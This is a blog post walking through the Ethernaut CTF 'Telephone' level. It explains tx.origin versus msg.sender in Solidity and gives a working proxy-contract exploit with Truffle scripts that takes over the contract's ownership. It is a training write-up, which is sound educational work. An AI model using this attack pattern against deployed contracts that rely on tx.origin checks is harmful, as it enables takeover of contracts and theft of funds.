Title: Solving Zeppelin's Ethernaut CTF - Telephone
Date: 2018-06-10 18:20
Tags: ethereum, solidity, ctf, smart contracts
Category: Ethereum
Slug: solving-zeppelin-ethernaut-ctf-telephone
Summary: Fifth post of a series in which we tackle the challenges in the [Ethernaut CTF by Zeppelin](https://ethernaut.zeppelin.solutions/){:target="_blank",:rel="noopener"}. We claim ownership of the Telephone contract by first understanding the difference between the sender and origin of Ethereum transactions.

## Introduction
The Telephone contract challenge is far from being the hardest or most complex of all, but through solving it we will dig a bit deeper in how Ethereum works internally. Not so much to say here, so just go and [read the challenge](https://ethernaut.zeppelin.solutions/level/0x6b7b4a5260b67c1ee9196a42dd1ed8633231ba0a){:target="_blank",:rel="noopener"}.

## The Telephone Contract
Our objective is to claim ownership of the contract. According the the constructor's code, the deployer is the first owner.
~~~solidity
function Telephone() public {
    owner = msg.sender;
}
~~~

Anybody with intentions to become the new owner must call the public `changeOwner` function passing the address as an argument:
~~~solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
}
~~~
Doesn't seem so difficult, except for that `if` clause. Let's see what it means.

Among the available global variables in Solidity, there're two which can be a bit confusing at first: `msg.sender` and `tx.origin`. Up until now, we've only seen and used `msg.sender` to reference the caller's address. However, while [solving the Coinflip challenge](https://www.hackingmood.com/ethereum/solving-zeppelin-ethernaut-ctf-coinflip), we learned that public functions can be called both from 'outside' the blockchain (i.e. from an externally owned account) or 'inside' the blockchain (from another contract's code).
Moreover, we stated that while all **transactions** are originated by an EOA, contracts can send messages to each other, those messages being all included in the same transaction which triggered the whole call chain.

As a result, in Solidity there are two different global variables to reference each of those cases. On the one hand, `msg.sender` references the actual caller (the last caller in the call chain) of the function. It could be an EOA or a contract address.

On the other hand, `tx.origin` indicates the address of the EOA that gave origin to the whole transaction.

For instance, imagine that the externally owned account 'A' calls a function in contract 'B' which calls a function in contract 'C'. This super complex call chain results in: A -> B -> C. In B's code, `tx.origin` and `msg.sender` would be the same: the address of A. Conversely, in C's code, `tx.origin` and `msg.sender` would be different: while `msg.sender` would be B's address, `tx.origin` would equal A's address.

All of this means that, to become the owner of Telephone, an attacker cannot simply call the `changeOwner` public function from his/her EOA. Were he/she to do that, `tx.origin` would always equal `msg.sender` (your address), thus the `if` clause would never be true.

Instead, the solution relies on deploying a new 'proxy' contract (just like we did in the Coinflip challenge) controlled by the attacker (us), which will be in charge of calling the `changeOwner` function of `Telephone` contract and become its owner on the attacker's behalf.

## The exploit

Let's first write the `TelephoneAttack` contract code. Note its similarities with the [`CoinflipAttack` contract](https://github.com/tinchoabbate/ethernaut-ctf/blob/master/contracts/CoinFlipAttack.sol){:rel="noopener"} we saw in the previous post. The same observations we highlighted in that one apply here as well.

~~~solidity
pragma solidity ^0.4.18;

import "./Telephone.sol";

contract TelephoneAttack {
    Telephone public victimContract;

    function setVictim(address _addr) public {
        victimContract = Telephone(_addr);
    }

    function changeOwner(address _owner) public {
        victimContract.changeOwner(_owner);
    }
}
~~~

Once you added `Telephone.sol` and `TelephoneAttack.sol` to the `contracts` folder of your project, write the necessary code (see below) to deploy both of them to the blockchain in `migrations/2_deploy_contracts.js`. Then run `truffle migrate`.

~~~javascript
let Telephone = artifacts.require('./Telephone.sol')
let TelephoneAttack = artifacts.require('./TelephoneAttack.sol')
module.exports = deployer => {
    deployer.deploy(Telephone)
    deployer.deploy(TelephoneAttack)
}
~~~

Inside your `exploits` folder, create a file called `telephone.exploit.js`. As always, follow the same code structure used for the previous exploits:

~~~javascript
const TelephoneContract = artifacts.require('Telephone')
const TelephoneAttackContract = artifacts.require('TelephoneAttack')
const assert = require('assert')

async function execute(callback) {
    let victimContract = await TelephoneContract.deployed()
    let proxyContract = await TelephoneAttackContract.deployed()

    // Set the victim's address
    proxyContract.setVictim(victimContract.address)
    
    // Get the attacker account
    let attackerAccount = web3.eth.accounts[1]
    console.log(`Attacker account is ${attackerAccount}`)

    // Check original owner
    let contractOwner = await victimContract.owner.call()
    console.log(`Original owner ${contractOwner}`)

    callback()
}
module.exports = execute
~~~

Changing the owner is just a matter of calling our malicious contract's `changeOwner` function from our attacker account. Then verify that the ownership was succesfuly changed:
~~~javascript
// Change owner
await proxyContract.changeOwner(attackerAccount, {
    from: attackerAccount
})

// Check final owner
contractOwner = await victimContract.owner.call()
assert.equal(contractOwner, attackerAccount)
console.log(`New owner ${contractOwner}`)
~~~

Now run `truffle exec exploits/telephone.exploit.js` and that's it! Challenge passed.

See the [full code of the exploit](https://github.com/tinchoabbate/ethernaut-ctf/blob/master/exploits/telephone.exploit.js) and the [attacker contract code](https://github.com/tinchoabbate/ethernaut-ctf/blob/master/contracts/TelephoneAttack.sol).

Thanks for reading!. For the [next post](https://www.hackingmood.com/ethereum/solving-zeppelin-ethernaut-ctf-token/), be ready to **steal some ethers** from a basic token contract and pass the [Token challenge](https://ethernaut.zeppelin.solutions/level/0x6545df87f57d21cb096a0bfcc53a70464d062512){:rel="noopener"}.
